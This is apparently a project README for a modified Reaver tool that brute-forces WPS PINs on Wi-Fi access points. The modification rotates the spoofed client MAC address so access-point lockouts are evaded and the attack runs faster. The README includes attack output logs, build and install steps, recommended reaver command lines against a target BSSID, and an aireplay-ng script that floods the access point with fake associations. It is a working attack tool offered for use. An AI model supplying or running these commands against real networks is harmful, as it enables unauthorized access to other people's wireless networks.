REAVER WPS WITH MAC CHANGER
==============

REAVER WPS modified version with MAC Address last character changer to speed up the attack.

Well, some times the AP will reject the "EAPOL Request" after a success pin try. I made some tests with simultaneous reaver instances running with different MACs (the -m argument), and when one instance gets "WARNING: Receive timeout occurred", the other gets "Received identity request" and continue the cracking.

The problem of this method is: The reaver tool doesn't support simultaneous instances (ok, I read the FAQ about it). If you run two reaver instances, by example, the two instances will try the same pin at the same time.

I made some changes on the reaver source code. Look the output after my changes:

```
[+] Using MAC BC:99:47:B7:03:E9
[+] Trying pin 00485678
[+] Sending EAPOL START request
[!] WARNING: Receive timeout occurred
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M1 message
[+] Received M1 message
[+] Received M1 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M3 message
[+] Received M3 message
[+] Received WSC NACK
[+] Sending WSC NACK
[+] Using MAC BC:99:47:B7:03:E8
[+] Trying pin 00495677
[+] Sending EAPOL START request
[!] WARNING: Receive timeout occurred
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M1 message
[+] Received M1 message
[+] Received M1 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M3 message
[+] Received M3 message
[+] Received M3 message
[+] Received WSC NACK
[+] Sending WSC NACK
[+] Using MAC BC:99:47:B7:03:E7 
[+] Trying pin 00505673
...
```

On the first try, reaver is using the client MAC "BC:99:47:B7:03:E9" (it is not a real MAC, I'm just using for the example), on the second, "BC:99:47:B7:03:E8", on the third, "BC:99:47:B7:03:E7". Well, after the use of the MAC "BC:99:47:B7:03:E0", reaver will start again on "BC:99:47:B7:03:E9".

The numbers:

With this method: (13 seconds/pin)
Without this method: (31 seconds/pin)

How to install
==============

Extract the tarball

```bash
    tar -xzvf reaver-1.4-mac-changer.tar.gz
```

Install Required Libraries and Tools

```bash
    sudo apt-get install libpcap-dev sqlite3 libsqlite3-dev libpcap0.8-dev
```

Build Reaver

```bash
    cd reaver-1.4-mac-changer
    cd src
    ./configure
    make
```

Install Reaver

```bash
    sudo make install
```

How to use
==============

```bash
reaver -i mon0 -b AA:BB:CC:DD:EE:FF -M
```

or

```bash
reaver -i mon0 -b AA:BB:CC:DD:EE:FF --mac-changer
```

What I recommend:

```bash
reaver -i mon0 -b AA:BB:CC:DD:EE:FF --mac-changer --no-nacks --win7 --no-associate -vv
```

To associate more effectively, I recommend to use aireplay-ng tool. Create a "associate.sh" file, and put this inside:

```bash
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:ZF  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:ZE  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:ZD  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:ZC  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:ZB  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:ZA  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z9  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z8  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z7  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z6  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z5  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z4  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z3  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z2  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z1  &
aireplay-ng mon0 -1 120 -a AA:BB:CC:DD:EE:FF --ignore-negative-one -h ZZ:ZZ:ZZ:ZZ:ZZ:Z0  &
```

PS: Change AA:BB:CC:DD:EE:FF to the BSSID and ZZ:ZZ:ZZ:ZZ:ZZ:Z to your MAC (without the last digit).

Before using reaver tool, just type "sh associate.sh". To kill all the aireplay-ng, type "killall aireplay-ng".

If you have success using this method, please, share with us to improve more and more the reaver WPS.

Author
==============

[@gabrielrcouto](http://www.twitter.com/gabrielrcouto)


License
==============

[MIT License](http://zenorocha.mit-license.org/)
